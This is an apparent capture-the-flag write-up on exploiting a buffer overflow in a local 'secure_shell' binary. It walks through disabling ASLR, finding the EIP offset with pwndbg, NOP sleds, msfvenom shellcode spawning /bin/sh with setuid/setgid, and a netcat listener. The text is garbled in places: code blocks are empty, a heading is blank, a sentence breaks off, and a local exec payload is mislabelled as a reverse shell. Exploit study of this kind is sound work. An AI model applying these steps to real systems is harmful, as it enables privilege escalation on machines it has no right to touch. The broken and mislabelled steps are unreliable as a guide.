Following on from the override solution, we'll look at gaining a reverse shell

### Checking ASLR

To identify if ASLR (Address Space Layout Randomization) is present, we can
see the memory location that libc is placed at changes for each run:

```
user@490ddfc1d226:~/app$ ldd ./secure_shell
        linux-gate.so.1 (0xf7f3c000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d3d000) <----
        /lib/ld-linux.so.2 (0xf7f3d000)
user@490ddfc1d226:~/app$ ldd ./secure_shell
        linux-gate.so.1 (0xf7fb0000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7db1000) <----
        /lib/ld-linux.so.2 (0xf7fb1000)
```

As the memory location different, ASLR is enabled. Let's disable it to make life easier.

### Configure ASLR

The ASLR flag has different settings:

- `0` - disableds
- `1` - Conservative: Shared libraries and PIE binaries are randomized
- `2` - Conservative and start of brk area is randomized, too


This value can be temporarily be configured via the file system:
```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## Writing an exploit

The linux stack frame looks like:

```
---------------------
|       ESP         |
---------------------
| local variables   |
|-------------------|
|   Saved EBP       |
|-------------------|
| Return Addr (EIP) |
---------------------
```

We can overwrite the saved EIP, but what value should we write? For now,
we can write a large buffer overflow, fill it with `\x90` nop assembly instructions,
and write EIP with the memory address of the function we are overflowing plus an
additional. The stack would then look like:

```
---------------------
| AAAA...           |
|-------------------|
| AAAA....          |
|-------------------|
| EIP override      |
|-------------------|
| nop...            |
|-------------------|
| nop...            |      
|-------------------|
| nop...            |      
|-------------------|
| Shell code        |
|-------------------|
```

For now let's get the value of $esp when `login` runs, we will treat that as our base value,n
and add an arbitrary number within our payload script:

```
pwndbg> b *login
Breakpoint 1 at 0x804925e: file secure_shell.c, line 11.
pwndbg> run
Starting program: /home/user/app/secure_shell 
warning: Error disabling address space randomization: Operation not permitted
Please enter secure shell password:
[press ctrl+c]
pwndbg> p $esp
$1 = (void *) 0xffffd65c
```

Choosing a memory location to jump to can be hard; This is why `nop_sleds` are used.
Using `\x90` for instructions that perform no operations, we can

##  

```
pwndbg> run < <(cyclic 100)
... etc ...
pwndbg> p $eip
$2 = (void (*)()) 0x6161616d
pwndbg> cyclic -l 0x6161616d
48
```

## Test payload

We'll use a placeholder shell_code of `\xcc` - which will signal an interrupt
signal which can be caught by the gdb debugger. This will help verify that the
buffer overflow has worked successfully:

```

```

## Choosing a payload

We can use msfvenom to generate a payload:
```
msfvenom -p linux/x86/exec CMD=/bin/sh --bad-chars '\x00\x0a\xff' -f python --var-name shell_code
```

We can also pipe this to `nasm` to see what instructions are being performed:
```
msfvenom -p linux/x86/exec CMD=/bin/sh -f raw
msfvenom -p linux/x86/exec CMD=/bin/sh -f raw | ndisasm -u -
msfvenom -p linux/x64/exec CMD=/bin/sh -f raw | ndisasm -b 64 -
```

At a pinch, there are online assembler/disassemblers that can be leveraged,
https://defuse.ca/online-x86-assembler.htm#disassembly

We could also generate a reverse shell:
```
msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0a\x0d' --var-name shell_code
```

This would require a ncat listener:

```
nc -lnvp 4444
```

Note that in our case, we additionally prepend setuid/setgid calls: 
```
./msfvenom -p linux/x86/exec CMD=/bin/sh PrependSetuid=true PrependSetgid=true -f raw -b '\x00\x0a\x0d' --var-name shell_code -f python
```

Running:

```
(python3 reverse.py; echo ''; cat) | ./secure_shell
```

### Bypassing ASLR

If we continue to run our payload, we will eventually gain a reverse shell:
```

```
